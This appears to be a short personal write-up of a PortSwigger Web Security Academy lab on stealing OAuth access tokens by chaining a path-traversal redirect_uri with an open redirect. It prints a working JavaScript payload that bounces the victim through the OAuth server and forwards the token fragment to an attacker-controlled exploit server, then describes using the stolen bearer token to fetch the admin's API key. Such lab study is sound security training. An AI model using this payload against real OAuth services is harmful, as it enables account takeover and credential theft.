# [Stealing OAuth access tokens via an open redirect] — [PortSwigger] — [Practitioner]
**Date:** 2026-07-22
 
---
 
## Vulnerability / core concept
OAuth

---


## Payload / key command
This web application is using social profile to log in. During inspection can notice that `redirect_uri` is validating the URI against a whitelist. However, we can append path traversal to endpoint which is vulnerable to open redirect. That `redirect_uri` in my case looks like this:
```bash
redirect_uri=https://0a74005f0491b3398047a3e3001d0061.web-security-academy.net/oauth-callback/../post/next?path=https://exploit-0a1000db0451b35f80f0a2cf01220062.exploit-server.net/exploit
```
We can chain vulnerable `redirect_uri` and open redirect to extract the `access_token` of the administrator. However, the redirect happens server-side, therefore, it is not possible to extract fragment as it is not sent over. That is why we need to deliver the following script to victim:
```bash
<script>
   if (!window.location.hash) {
        window.location = 'https://oauth-0a82008004e1b3c8805da16d02ce0077.oauth-server.net/auth?client_id=f6f3zesqekj9jv8zzw5b7&redirect_uri=https://0a74005f0491b3398047a3e3001d0061.web-security-academy.net/oauth-callback/../post/next?path=https://exploit-0a1000db0451b35f80f0a2cf01220062.exploit-server.net/exploit&response_type=token&nonce=592379317&scope=openid%20profile%20email'
    } else {
        window.location = '/?'+window.location.hash.substring(1)
    }
</script>
```
This script does:
1) Checks if the `window.location.hash` is empty during first execution.
2) If it is empty, load our payload with open redirect to get that `access_token` fragment.
3) Afterwards, if it is not empty, append that fragment to the uri so we can see it in our exploit server.

After doing this and extracting `access_token`, we can see that even though we are logged in as `administrator` we cannot see the `API` key as it is hidden. To extract that API key we need to use `/me` endpoint that returns details about user including API key based on the `access_token` in the `Authorization: Bearer access_token` header (that we currently have). Next step would be submitting the acquired API key to solve this lab.
